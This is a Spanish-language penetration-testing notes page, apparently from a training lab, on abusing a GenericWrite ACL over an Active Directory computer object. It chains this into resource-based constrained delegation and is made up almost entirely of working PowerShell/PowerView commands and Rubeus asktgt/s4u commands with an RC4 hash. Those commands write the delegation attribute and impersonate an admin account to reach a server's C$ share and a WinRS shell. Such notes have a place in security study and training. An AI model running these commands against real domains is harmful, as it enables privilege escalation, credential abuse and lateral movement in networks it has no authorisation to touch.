# Abuso ACL 

Tags: #AD #ACL #Windows 

## GenericWrite sobre Computador

* [Abusin-AD-ACLs-ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [HackTricks-Abusing-AD-ACLs-ACE](https://book.hacktricks.xyz/es/windows-hardening/active-directory-methodology/acl-persistence-abuse)

Si tenemos esta ACL sobre un objeto Computer, permite modificar determinados atributos del objeto Computer en Active Directory. En este escenario, se aprovecha para modificar la configuración necesaria del Computer y continuar con RBCD.

## Enumeración 
```powershell
# Paso 1: Obtener el objeto del usuario que posee GenericWrite
❯ $user = Get-ADUser -Identity "compwrite.user"

# Paso 2: Obtener su SID
❯ $SID = $user.SID

# Paso 3: Comprobar que compwrite.user tiene GenericWrite sobre el Computer objetivo
❯ Get-ObjectAcl -SamAccountName First-DC -ResolveGUIDs | ?{$_.ActiveDirectoryRights -eq "GenericWrite" -and $_.SecurityIdentifier -eq $SID} | Select AceType,ActiveDirectoryRights,ObjectDN | Format-List


# Otra forma de poner el SID pero antes se debe agregar a la variable convertido 
❯ Get-ObjectAcl -SamAccountName First-DC -ResolveGUIDs | ?{$_.ActiveDirectoryRights -eq "GenericWrite" -and $_.SecurityIdentifier -eq $SID } | select AceType,ActiveDirectoryRights,ObjectDN | fl

# Objetivo:
# Confirmar que compwrite.user tiene GenericWrite sobre First-DC.
# GenericWrite → modificar atributos del Computer → configurar RBCD → continuar la escalada.


NOTA
	- Despues de esto sigue el RBCD
```

## Explotación  RBCD 
```powershell 
# Importar el ticket
❯ Rubeus.exe asktgt /user:studvm$ /rc4:c48ea647156d946bc135515eaa0c954b /domain:domain.corp /ptt
```

```powershell 
❯ Get-DomainObjectAcl -Identity "PC_Vulnerable" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite|WriteProperty'}

# Abuso RBCD 
❯ $ComputerSid = (Get-DomainComputer "PC_Atacante" -Properties objectsid).objectsid
❯ $ComputerSid  # Mirar el contenido de la variable 

❯ $SD = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)")

# Convertir a bytes 
❯ $SDBytes = New-Object byte[]($SD.BinaryLength)
❯ $SD.GetBinaryForm($SDBytes, 0)

# Aplicar el permiso 
❯ Get-DomainComputer "PC_Vulnerable" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Verificaar si funcionó 
❯ Get-DomainComputer "PC_Vulnerable" -Properties msds-allowedtoactonbehalfofotheridentity
```

```powershell 
# Impersonas y con este ticket puedes ver CIFS (SMB)
❯ .\Rubeus.exe s4u /user:studvm$ /rc4:c48ea647156d946bc135515eaa0c954b /impersonateuser:techadmin /msdsspn:cifs/mgmtsrv.tech.corp /domain:tech.corp /ptt

❯ ls \\mgmtsrv.domain.corp\c$   # Listar el contenido 
```

```powershell 
# Impersonas y con este ticket puedes conectarte por Winrs al server 
❯ .\Rubeus.exe s4u /user:studvm$ /rc4:c48ea647156d946bc135515eaa0c954b /impersonateuser:techadmin /msdsspn:http/mgmtsrv.tech.corp /domain:tech.corp /ptt

❯ winrs -r:mgmmtsrv.domain.corp cmd   # Ingresar al server 
```